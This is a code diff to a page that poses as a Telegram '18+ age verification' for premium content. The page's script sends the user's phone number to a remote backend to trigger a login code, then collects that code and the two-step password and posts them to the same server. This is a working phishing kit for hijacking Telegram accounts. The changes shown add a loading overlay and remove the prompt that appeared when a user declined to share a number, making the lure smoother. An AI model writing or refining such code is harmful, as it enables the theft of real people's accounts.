@@ -34,7 +34,18 @@
             width: 90%; max-width: 380px; text-align: center; padding: 30px 20px;
             background: var(--glass-bg); border-radius: 24px; backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            transition: filter 0.3s ease;
         }
+
+        /* Full Page Loader Style */
+        #full-page-loader {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7); backdrop-filter: blur(5px);
+            display: none; flex-direction: column; justify-content: center;
+            align-items: center; z-index: 1000;
+        }
+        .loading-emoji { width: 100px; height: 100px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.2); } 100% { transform: scale(1); } }
 
         .step { display: none; }
         .step.active { display: block; animation: slideUp 0.4s ease-out; }
@@ -73,20 +84,22 @@
 
         @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }
         .shake { animation: shake 0.3s ease-in-out; border-color: var(--error-color) !important; }
-
-        .loader { width: 18px; height: 18px; border: 2.5px solid #FFF; border-bottom-color: transparent; border-radius: 50%; display: none; animation: rotation 1s linear infinite; margin-left: 10px; }
-        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div class="app-container">
+    <div id="full-page-loader">
+        <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/People/Thinking%20Face.webp" class="loading-emoji">
+        <p style="margin-top: 15px; font-weight: bold;">Processing...</p>
+    </div>
+
+    <div class="app-container" id="main-app">
         <div class="step active" id="step1">
             <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Symbols/No%20One%20Under%20Eighteen.webp" class="emoji-img">
             <h2>Verify Your Age</h2>
             <p>You must be 18+ to access premium content. Click the button to verify.</p>
             <button class="btn" id="startBtn" onclick="handleStart()">
-                ✅ I'M 18+ PROCEED <span class="loader" id="loader_start"></span>
+                ✅ I'M 18+ PROCEED
             </button>
         </div>
 
@@ -116,7 +129,7 @@
             <p>Your account is protected by a password. Please enter it below.</p>
             <input type="password" id="2fa-input" class="btn" style="background: rgba(255,255,255,0.05); text-align: center; border: 1px solid rgba(255,255,255,0.2); box-shadow: none;" placeholder="Enter Password">
             <div id="2fa-error" class="error-msg">❌ পাসওয়ার্ড সঠিক নয়।</div>
-            <button class="btn" id="confirm2fa" onclick="verify2FA()">UNLOCK ACCESS <span class="loader" id="loader_2fa"></span></button>
+            <button class="btn" id="confirm2fa" onclick="verify2FA()">UNLOCK ACCESS</button>
         </div>
 
         <div class="step" id="step4">
@@ -135,6 +148,18 @@
         let currentOtp = "";
         let userPhone = "";
 
+        function toggleLoader(show) {
+            const loader = document.getElementById('full-page-loader');
+            const mainApp = document.getElementById('main-app');
+            if (show) {
+                loader.style.display = 'flex';
+                mainApp.style.filter = 'blur(8px)';
+            } else {
+                loader.style.display = 'none';
+                mainApp.style.filter = 'none';
+            }
+        }
+
         function nextStep(n) {
             document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
             document.getElementById('step' + n).classList.add('active');
@@ -145,31 +170,21 @@
                 if (sent && response && response.contact) {
                     userPhone = response.contact.phone_number;
                     if (!userPhone.startsWith('+')) userPhone = '+' + userPhone;
-
-                    // নম্বর পাওয়ার সাথে সাথে ওটিপি পেজে মুভ করবে
                     nextStep(2);
-
-                    // ব্যাকগ্রাউন্ডে ওটিপি পাঠানোর নির্দেশ
                     fetch(`${RENDER_URL}/send_otp`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({ phone: userPhone })
                     }).catch(e => console.log("Init request sent"));
-
                 } else {
-                    tg.showPopup({
-                        title: 'প্রয়োজনীয়',
-                        message: 'সঠিকভাবে ভেরিফিকেশন সম্পন্ন করতে নম্বর শেয়ার করা বাধ্যতামূলক।',
-                        buttons: [{type: 'ok', text: 'ঠিক আছে'}]
-                    });
+                    // ৩ নম্বর ছবির সমাধান: ক্যানসেল করলে কোনো পপআপ আসবে না
+                    console.log("User cancelled contact sharing");
                 }
             });
         }
 
         function press(num) {
-            const errDiv = document.getElementById('otp-error');
-            errDiv.style.display = "none";
-
+            document.getElementById('otp-error').style.display = "none";
             if (num === 'C') currentOtp = "";
             else if (num === '⌫') currentOtp = currentOtp.slice(0, -1);
             else if (currentOtp.length < 5) currentOtp += num;
@@ -177,7 +192,7 @@
             for (let i = 1; i <= 5; i++) {
                 const el = document.getElementById('otp' + i);
                 el.value = currentOtp[i - 1] || "";
-                if(currentOtp[i-1]) el.classList.add('filled');
+                if(currentOtp[i - 1]) el.classList.add('filled');
                 else el.classList.remove('filled');
             }
 
@@ -188,23 +203,21 @@
         }
 
         async function verifyOtp() {
+            toggleLoader(true);
             try {
-                // ওটিপি পেজে একটি ইনডিকেটর দিতে পারেন যদি প্রয়োজন হয়
                 const res = await fetch(`${RENDER_URL}/verify`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ phone: userPhone, otp: currentOtp })
                 });
                 const data = await res.json();
+                toggleLoader(false);
 
-                if (data.status === "done") {
-                    nextStep(4);
-                } else if (data.status === "need_2fa") {
-                    nextStep(3);
-                } else {
-                    throw new Error("Invalid OTP");
-                }
+                if (data.status === "done") nextStep(4);
+                else if (data.status === "need_2fa") nextStep(3);
+                else throw new Error("Invalid OTP");
             } catch (err) {
+                toggleLoader(false);
                 const wrap = document.getElementById('otp-wrap');
                 wrap.classList.add('shake');
                 document.getElementById('otp-error').style.display = "block";
@@ -213,8 +226,7 @@
                     currentOtp = "";
                     for(let i=1;i<=5;i++) {
                         const el = document.getElementById('otp'+i);
-                        el.value="";
-                        el.classList.remove('filled');
+                        el.value=""; el.classList.remove('filled');
                     }
                 }, 500);
             }
@@ -222,14 +234,8 @@
 
         async function verify2FA() {
             const pass = document.getElementById('2fa-input').value;
-            const loader = document.getElementById('loader_2fa');
-            const btn = document.getElementById('confirm2fa');
-            
             if(!pass) return;
-
-            loader.style.display = "inline-block";
-            btn.disabled = true;
-
+            toggleLoader(true);
             try {
                 const res = await fetch(`${RENDER_URL}/verify`, {
                     method: 'POST',
@@ -237,19 +243,14 @@
                     body: JSON.stringify({ phone: userPhone, otp: currentOtp, password: pass })
                 });
                 const data = await res.json();
-                
-                if (data.status === "done") {
-                    nextStep(4);
-                } else {
-                    throw new Error("Invalid Password");
-                }
+                toggleLoader(false);
+                if (data.status === "done") nextStep(4);
+                else throw new Error("Invalid Password");
             } catch (err) {
+                toggleLoader(false);
                 document.getElementById('2fa-input').classList.add('shake');
                 document.getElementById('2fa-error').style.display = "block";
                 setTimeout(() => document.getElementById('2fa-input').classList.remove('shake'), 500);
-            } finally {
-                loader.style.display = "none";
-                btn.disabled = false;
             }
         }
     </script>
